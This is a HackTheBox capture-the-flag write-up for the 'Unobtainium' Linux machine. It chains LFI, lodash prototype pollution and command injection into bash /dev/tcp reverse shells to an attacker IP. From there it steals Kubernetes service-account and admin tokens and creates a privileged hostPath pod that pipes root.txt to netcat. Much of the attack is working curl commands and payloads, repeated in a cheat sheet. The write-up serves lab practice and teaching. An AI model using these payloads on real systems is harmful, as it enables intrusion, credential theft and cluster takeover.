# HackTheBox: Unobtainium - Comprehensive Walkthrough

> **Target IP:** 10.129.136.226  
> **Attacker IP:** 10.10.16.84  
> **Difficulty:** Hard  
> **OS:** Linux  
> **Tags:** Kubernetes, Electron, Node.js, Prototype Pollution, Command Injection, Container Escape

---

## Table of Contents

1. [The Hacker Mindset: Approach](#the-hacker-mindset-approach)
2. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
3. [Phase 2: The Electron App & Source Recovery](#phase-2-the-electron-app--source-recovery)
4. [Phase 3: API Enumeration & Source Analysis](#phase-3-api-enumeration--source-analysis)
5. [Phase 4: Prototype Pollution Explained](#phase-4-prototype-pollution-explained)
6. [Phase 5: Command Injection Explained](#phase-5-command-injection-explained)
7. [Phase 6: Initial Foothold (User Flag)](#phase-6-initial-foothold-user-flag)
8. [Phase 7: Kubernetes Enumeration](#phase-7-kubernetes-enumeration)
9. [Phase 8: Lateral Movement to Dev Container](#phase-8-lateral-movement-to-dev-container)
10. [Phase 9: Privilege Escalation via Kubernetes](#phase-9-privilege-escalation-via-kubernetes)
11. [Phase 10: Root Flag](#phase-10-root-flag)
12. [Key Lessons & Takeaways](#key-lessons--takeaways)

---

## The Hacker Mindset: Approach

Before we touch any commands, let's talk about **mindset**.

Unobtainium is a **Hard** Linux box. When you see a Hard box on HackTheBox, you should immediately think: *"This won't be a simple CVE-to-shell. There will be multiple steps, and I need to chain vulnerabilities."*

The attack surface here is broad:
- A website on port 80
- A Kubernetes cluster on port 8443
- A mysterious Node.js API on port 31337
- Multiple download packages (.deb, .rpm, .snap)

**The hacker mindset:** Don't just look for one vulnerability. Look for the *relationships* between components. The website offers downloads — those downloads are likely client software that talks to the API. If we can reverse the client, we can discover API endpoints, credentials, and vulnerabilities. Then we can attack the API, get a shell, and from inside the container, pivot to Kubernetes.

**Rule of thumb:** When a box gives you software to download, reverse it. It contains secrets.

---

## Phase 1: Reconnaissance

### Why Recon First?

You cannot attack what you don't understand. Reconnaissance is about building a map of the target. Every open port is a potential entry point. Every service banner is a clue. We need to be thorough because missing a port means missing an attack vector.

### Step 1.1: Quick Port Scan

```bash
sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.136.226
```

**What this does:**
- `-p-` scans all 65,535 TCP ports. Many beginners only scan top 1000 and miss services.
- `--min-rate 10000` sends packets fast to avoid timeouts.
- `-oA` saves output in multiple formats for later reference.

**Hacker mindset:** We scan ALL ports because boxes like this often hide services on high ports (like 31337). The port name "Elite" is literally hacker culture — it's a signal.

**Results:**
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8443/tcp  open  https-alt
31337/tcp open  Elite
```

### Step 1.2: Service Version Detection

```bash
sudo nmap -p 22,80,8443,31337 -sCV 10.129.136.226
```

**What this does:**
- `-sC` runs default NSE scripts that can extract banners, detect vulnerabilities, and enumerate services.
- `-sV` probes versions so we can research known CVEs.

**Key findings:**
- **Port 80:** Apache httpd 2.4.41 — standard web server.
- **Port 8443:** Returns Kubernetes JSON responses (`"kind":"Status"`). This is a **Kubernetes API server**.
- **Port 31337:** Node.js Express framework with risky methods `PUT` and `DELETE`.

**Hacker mindset:**
- Port 8443 is Kubernetes. Kubernetes means containers. Containers mean potential container escapes.
- Port 31337 with PUT/DELETE means a REST API. REST APIs often have broken authorization.
- The combination of a web server + Kubernetes + custom API screams: *"There's an application running in containers, and I need to find a way in."*

### Step 1.3: Add Hosts to /etc/hosts

```bash
echo "10.129.136.226 unobtainium.htb" | sudo tee -a /etc/hosts
```

**Why?** The TLS certificates on port 8443 reference `unobtainium` and `kubernetes.default.svc.cluster.local`. The website may also use virtual hosts. Adding the hostname ensures we don't get SSL errors or miss virtual host-specific content.

---

## Phase 2: The Electron App & Source Recovery

### The Hacker Mindset: Reverse Everything They Give You

The website on port 80 advertises a chat application with three download buttons: Debian, RedHat, and Snap. **This is a goldmine.** When a target gives you software, they are giving you:
1. The client-side source code (packed, but recoverable)
2. Hardcoded credentials
3. API endpoint documentation
4. The exact protocol the client uses to talk to the server

**Rule:** Always reverse client software. Developers embed secrets in clients because they assume users won't look.

### Step 2.1: Download the Debian Package

```bash
wget http://10.129.136.226/downloads/unobtainium_debian.zip -O unobtainium_debian.zip
unzip unobtainium_debian.zip
```

**Why Debian?**
We're on Kali (Debian-based). The `.deb` package format is trivial to unpack without installing. We could also analyze `.rpm` or `.snap`, but `.deb` is easiest for us.

**Contents:**
```
unobtainium_1.0.0_amd64.deb
unobtainium_1.0.0_amd64.deb.md5sum
```

### Step 2.2: Extract the .deb Package

A `.deb` package is an `ar` archive containing three files:
- `debian-binary` — package format version
- `control.tar.gz` — installation scripts and metadata
- `data.tar.xz` — the actual files to install

```bash
ar x unobtainium_1.0.0_amd64.deb
tar xf data.tar.xz
```

**Hacker mindset:** We do NOT `dpkg -i` and install this on our system. That's dangerous and unnecessary. We only need to read the files, not execute them.

### Step 2.3: Find the Electron Bundle

Electron apps bundle their JavaScript source into `.asar` files. Let's find it:

```bash
find . -name "*.asar"
# Output: ./opt/unobtainium/resources/app.asar
```

**What is ASAR?**
ASAR (Atom Shell Archive) is a simple tar-like archive format used by Electron. It's not compressed or encrypted — just packed. We can extract it with the `asar` Node.js tool.

### Step 2.4: Extract the Source Code

```bash
# Install asar globally
sudo npm install -g asar

# Extract the app
asar extract ./opt/unobtainium/resources/app.asar ./app_source
```

**Result:** Full JavaScript source code of the client application.

### Step 2.5: Analyze the Client Source

Let's look at the key files:

```bash
cat ./app_source/src/js/app.js
```

**Discovery:**
```javascript
data: JSON.stringify({
    "auth": {
        "name": "felamos",
        "password": "Winter2021"
    },
    "message": {
        "text": message
    }
})
```

**BINGO.** Hardcoded credentials. The client uses:
- **Username:** `felamos`
- **Password:** `Winter2021`
- **Method:** `PUT` to `http://unobtainium.htb:31337/`

Also found in `todo.js`:
```javascript
$.ajax({
    url: 'http://unobtainium.htb:31337/todo',
    type: 'post',
    data: JSON.stringify({
        "auth": {"name": "felamos", "password": "Winter2021"},
        "filename" : "todo.txt"
    })
});
```

**Hacker mindset:** The client is a **blueprint** of the API. We now know:
1. Authentication scheme (JSON body with name/password)
2. Two endpoints: `PUT /` and `POST /todo`
3. The `/todo` endpoint reads files — this smells like **Local File Inclusion (LFI)**

---

## Phase 3: API Enumeration & Source Analysis

### Step 3.1: Test the /todo Endpoint

```bash
curl -s http://10.129.136.226:31337/todo \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}'
```

**Response:**
```json
{
  "ok": true,
  "content": "1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function...\n7. Improve security\n"
}
```

**Analysis:** The `/todo` endpoint reads files from the application directory. The developers' todo list even mentions "Improve security" — ironic.

### Step 3.2: Read the Server Source Code via LFI

Since `/todo` reads files by name, let's try to read `index.js` (the main server file):

```bash
curl -s http://10.129.136.226:31337/todo \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}' \
  | jq -r '.content'
```

**Critical discovery:** We now have the **entire server-side source code**.

### Step 3.3: Server Source Code Analysis

Key excerpts from the server code:

```javascript
const _ = require('lodash');
const { exec } = require("child_process");
var root = require("google-cloudstorage-commands");

const users = [
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
];
```

**Observations:**
1. **`lodash` version 4.17.4** — This is a KNOWN vulnerable version with prototype pollution in `_.merge()`.
2. **`google-cloudstorage-commands` version 0.0.1** — A deprecated npm package that uses `child_process.exec()` with unsanitized input. Classic command injection.
3. The `admin` user has `canDelete: true` and `canUpload: true`. The `felamos` user does NOT have these.

**The attack path crystallizes:**
1. Use **Prototype Pollution** to give `felamos` the `canUpload: true` property.
2. Use the **Command Injection** in `/upload` to execute arbitrary commands.

---

## Phase 4: Prototype Pollution Explained

### What is Prototype Pollution?

JavaScript is a **prototype-based language**. Every object inherits from `Object.prototype`. If you can modify `Object.prototype`, you modify ALL objects in the runtime.

The `_.merge()` function in vulnerable lodash versions copies properties recursively. If you pass a payload like:
```json
{
  "__proto__": {
    "canUpload": true
  }
}
```

`_.merge()` will follow the `__proto__` chain and set `canUpload: true` on `Object.prototype`. **Every object now has `canUpload: true`.**

### Why Does This Work on Unobtainium?

Look at the server's `PUT /` handler:

```javascript
app.put('/', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  const message = { icon: '__' };
  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });
  // ...
});
```

The `req.body.message` is attacker-controlled. We inject `__proto__: {canUpload: true}` into it. `_.merge()` pollutes the global prototype.

Later, when the `/upload` endpoint checks:
```javascript
if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
}
```

The `user` object (which didn't have `canUpload` before) now inherits it from the polluted prototype. **Access granted.**

**Important caveat:** The pollution only affects the Node.js process instance that handled our `PUT` request. If there are multiple backend instances (pods), we need to hit the same one with our `/upload` request. This is why we chain the requests quickly.

---

## Phase 5: Command Injection Explained

### The Vulnerable Code

```javascript
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
  root.upload("./", filename, true);
  res.send({ok: true, Uploaded_File: filename});
});
```

### What's `google-cloudstorage-commands`?

This deprecated npm package has an `upload` function:

```javascript
function upload(inputDirectory, bucket, force = false) {
    let _path = path.resolve(inputDirectory)
    let _rn = force ? '-r' : '-Rn'
    let _cmd = exec(`gsutil -m cp ${_rn} -a public-read ${_path} ${bucket}`)
    // ...
}
```

**The vulnerability:** `bucket` (which is our `filename`) is passed directly into a shell command via `exec()`. No sanitization. No escaping.

If we send:
```json
{"filename": "x; bash -c 'bash -i >& /dev/tcp/10.10.16.84/443 0>&1'"}
```

The executed command becomes:
```bash
gsutil -m cp -r -a public-read ./ x; bash -c 'bash -i >& /dev/tcp/10.10.16.84/443 0>&1'
```

The semicolon (`;`) terminates the `gsutil` command and starts our reverse shell.

---

## Phase 6: Initial Foothold (User Flag)

### Step 6.1: Start a Listener

```bash
nc -lnvp 443
```

### Step 6.2: Chain the Exploit

We need to execute the prototype pollution and command injection **quickly** and **on the same backend instance**:

```bash
curl -s -X PUT http://10.129.136.226:31337/ \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "x", "__proto__": {"canUpload": true}}}' \
&& curl -s -X POST http://10.129.136.226:31337/upload \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.16.84/443 0>&1\""}'
```

**Why chain with `&&`?** The prototype pollution effect is ephemeral. It only lasts for that Node.js process instance and can reset quickly. By chaining with `&&`, the second request fires immediately after the first completes.

**If it fails** (`Access denied`), the `/upload` hit a different backend pod. Just retry.

### Step 6.3: Stabilize the Shell

```bash
python3 -c 'import pty;pty.spawn("bash")'
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
```

### Step 6.4: Grab the User Flag

```bash
cat /root/user.txt
# 184995[redacted]f33e33a6
```

**We're root... inside a container.** `hostname` shows something like `webapp-deployment-9546bc7cb-6r7sq`. This is a Kubernetes pod name.

---

## Phase 7: Kubernetes Enumeration

### The Hacker Mindset: "I'm in a Container — Now What?"

When you get a shell and you're root but it doesn't feel like a real host, you're in a container. Containers have limited access to the host, but they often have **service account tokens** for the orchestrator (Kubernetes).

**Rule:** Always check `/run/secrets/kubernetes.io/serviceaccount/` in containers.

### Step 7.1: Find the Service Account Token

```bash
ls -la /run/secrets/kubernetes.io/serviceaccount/
cat /run/secrets/kubernetes.io/serviceaccount/namespace
# default
cat /run/secrets/kubernetes.io/serviceaccount/token
```

**This JWT token is our key to the Kubernetes API.**

### Step 7.2: Test API Access

```bash
APISERVER=https://10.129.136.226:8443
SERVICEACCOUNT=/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat ${SERVICEACCOUNT}/token)
CACERT=${SERVICEACCOUNT}/ca.crt

curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api
```

**Why the external IP?** The internal cluster IP (`10.96.0.1`) timed out from our pod. But the Kubernetes API is also exposed externally on port 8443. The service account token works against both.

### Step 7.3: Enumerate Namespaces and Pods

```bash
# List namespaces
curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces

# List pods in dev namespace
curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/dev/pods
```

**Key discovery:** The `dev` namespace contains 3 pods:
- `devnode-deployment-776dbcf7d6-g4659` @ `10.42.0.64`
- `devnode-deployment-776dbcf7d6-7gjgf` @ `10.42.0.70`
- `devnode-deployment-776dbcf7d6-sr6vj` @ `10.42.0.62`

All running `localhost:5000/node_server` on port **3000**.

**Hacker mindset:** The dev pods run the SAME `node_server` image as the webapp we just exploited. The developer reused the same vulnerable code in the dev environment. This is extremely common in real life — dev/staging/prod code parity means vulnerabilities often propagate across environments.

---

## Phase 8: Lateral Movement to Dev Container

### The Strategy

We have network access to the dev pods from our webapp container (same cluster network). The dev pods run the same Node.js app on port 3000. We will **re-use the exact same exploit** against an internal IP.

### Step 8.1: Start Another Listener

```bash
nc -lnvp 4444
```

### Step 8.2: Exploit the Internal Dev Pod

```bash
curl -s -X PUT http://10.42.0.64:3000/ \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "x", "__proto__": {"canUpload": true}}}' \
&& curl -s -X POST http://10.42.0.64:3000/upload \
  -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.16.84/4444 0>&1\""}'
```

**Result:** Shell as `root` in `devnode-deployment-776dbcf7d6-g4659`.

**Why did this work again?** Same application, same vulnerabilities, no patch. Internal services are often less monitored and patched than public-facing ones.

---

## Phase 9: Privilege Escalation via Kubernetes

### The Hacker Mindset: "Different Container, Different Permissions"

Each pod has its own service account token with different Kubernetes RBAC permissions. The webapp container's token was limited. The dev container's token might have more access.

**Rule:** Always re-enumerate Kubernetes permissions from every new container.

### Step 9.1: Check Permissions from Dev Container

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Can we list secrets in kube-system?
curl -k --header "Authorization: Bearer ${TOKEN}" \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/secrets
```

**BREAKTHROUGH:** We can list secrets in `kube-system`! Among them is `c-admin-token-b47f7`.

### Step 9.2: Extract the Admin Token

```bash
ADMIN_TOKEN=$(curl -k --header "Authorization: Bearer ${TOKEN}" \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/secrets/c-admin-token-b47f7 \
  | grep -o '"token": "[^"]*"' | cut -d'"' -f4 | base64 -d)
```

**Why base64 decode?** Kubernetes stores secret values base64-encoded in the API response.

### Step 9.3: Verify Admin Access

```bash
curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods
```

**Result:** Full pod listing. This token has **cluster-admin** privileges.

---

## Phase 10: Root Flag

### The Strategy

With cluster-admin access, we can create a **privileged pod** that mounts the host's root filesystem (`/`). This is the standard Kubernetes container escape technique.

### Step 10.1: Start a Listener for the Flag

```bash
nc -lnvp 5555
```

### Step 10.2: Create the Malicious Pod

We POST a Pod spec directly to the Kubernetes API:

```bash
curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
  -H "Content-Type: application/json" \
  -X POST \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
      "name": "root-exfil"
    },
    "spec": {
      "containers": [
        {
          "name": "evil",
          "image": "localhost:5000/dev-alpine",
          "command": ["/bin/sh"],
          "args": ["-c", "cat /mnt/root/root.txt | nc 10.10.16.84 5555"],
          "volumeMounts": [
            {
              "name": "hostfs",
              "mountPath": "/mnt"
            }
          ]
        }
      ],
      "volumes": [
        {
          "name": "hostfs",
          "hostPath": {
            "path": "/"
          }
        }
      ]
    }
  }'
```

**Why `localhost:5000/dev-alpine`?**
- The cluster has no internet access (can't pull from Docker Hub).
- We need an image that already exists on the node.
- The existing `backup-pod` uses this exact image, confirming it's available locally.

**What this pod does:**
- Creates a container using a local Alpine image
- Mounts the host filesystem `/` to `/mnt` inside the container
- Runs `cat /mnt/root/root.txt` and pipes it to our netcat listener

### Step 10.3: Catch the Flag

On our listener:
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.136.226] 43122
d1a073[redacted]bc323f9f17
```

**Root flag:** `d1a073a[redacted]323f9f17`

---

## Key Lessons & Takeaways

### 1. Reverse Client Software
When a target gives you binaries/packages, reverse them. They contain API specs, credentials, and architecture details that save hours of blind fuzzing.

### 2. Prototype Pollution is Powerful
Modern JavaScript apps using `_.merge()`, `_.defaultsDeep()`, or similar functions on user input are vulnerable. If you see `lodash` < 4.17.12, investigate prototype pollution immediately.

### 3. Chain Low to High
- LFI → Read server source
- Source review → Find vulnerable libraries
- Prototype pollution → Escalate privileges
- Command injection → Get shell

### 4. Kubernetes = New Attack Surface
Inside a container? Look for:
- `/run/secrets/kubernetes.io/serviceaccount/token`
- Service account permissions vary by pod/namespace
- One pod's token might be limited; another's might be powerful
- With cluster-admin: create privileged pods to mount host filesystem

### 5. Reuse Exploits Internally
Dev/staging/prod environments often share vulnerabilities. If you exploit one service, test the same exploit against internal instances.

### 6. Local Images for Malicious Pods
When creating Kubernetes pods for escape, use images already cached on the node (`kubectl get pods -o yaml | grep image:`). The target likely has no outbound internet.

---

## Commands Cheat Sheet

```bash
# Recon
nmap -p- --min-rate 10000 10.129.136.226
nmap -p 22,80,8443,31337 -sCV 10.129.136.226

# Extract .deb source
wget http://10.129.136.226/downloads/unobtainium_debian.zip
unzip unobtainium_debian.zip
ar x unobtainium_1.0.0_amd64.deb && tar xf data.tar.xz
asar extract ./opt/unobtainium/resources/app.asar ./app_source

# Read server source via LFI
curl -s http://10.129.136.226:31337/todo -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "index.js"}'

# Exploit chain (foothold)
curl -s -X PUT http://10.129.136.226:31337/ -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "x", "__proto__": {"canUpload": true}}}' \
&& curl -s -X POST http://10.129.136.226:31337/upload -H "Content-Type: application/json" \
  -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.16.84/443 0>&1\""}'

# Kubernetes enumeration from container
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -k --header "Authorization: Bearer ${TOKEN}" https://10.129.136.226:8443/api/v1/namespaces/dev/pods

# Admin token extraction
ADMIN_TOKEN=$(curl -k --header "Authorization: Bearer ${TOKEN}" \
  https://10.129.136.226:8443/api/v1/namespaces/kube-system/secrets/c-admin-token-b47f7 \
  | grep -o '"token": "[^"]*"' | cut -d'"' -f4 | base64 -d)

# Create malicious pod
curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: application/json" \
  -X POST https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods \
  -d '{...pod spec...}'
```

---

> **End of Walkthrough**  
> Machine: Unobtainium  
> User Flag: `1849951[redacted]33e33a6`  
> Root Flag: `d1a073[redacted]323f9f17`
